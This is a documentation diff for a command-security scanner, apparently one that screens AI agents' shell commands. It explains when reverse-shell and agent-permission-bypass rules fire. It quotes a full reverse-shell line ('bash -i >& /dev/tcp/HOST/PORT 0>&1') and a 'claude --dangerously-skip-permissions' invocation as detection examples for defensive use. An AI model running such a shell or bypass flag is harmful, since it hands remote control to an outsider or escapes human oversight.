@@ -57,6 +57,22 @@ finding rather than independent regex and CEL findings.
 Semantic-only rules use the intentionally never-matching RE2 sentinel `a^`
 when a raw command mention cannot safely serve as fallback evidence.
 
+A rule's pattern selects candidates; the fact its owner proves decides. Two
+CRITICAL rules that a hand test often meets show the fact each needs
+(rel-1-0-10:GAP-0178):
+
+- `CMD-REVSHELL-DEVTCP` and `CMD-REVSHELL-BASH` need a shell whose own input
+  and output are tied to the `/dev/tcp` socket, both directions on the same
+  command (`bash -i >& /dev/tcp/HOST/PORT 0>&1`). A one-way write such as
+  `bash -i -c 'echo probe > /dev/tcp/HOST/PORT'` is a probe or a transfer, not
+  a reverse shell, and gets neither finding although the pattern matches.
+- `exec.agent_runtime_bypass_flags` needs an agent run with a bypass flag:
+  the policy-bypass operation of a `claude`, `codex`, `gemini` or `opencode`
+  command (also behind `npx`, `pnpm dlx` or `bunx`).
+  `claude --dangerously-skip-permissions --version` prints a version, starts
+  no session and gets no finding; `claude --dangerously-skip-permissions -p
+  "..."` blocks in every pack.
+
 All trusted-action findings cross a final same-rule proof gate before they can
 affect a block decision. A complete code-owned semantic proof, a complete exact
 built-in CodeGuard proof, or a bounded code-owned exact fallback proof may
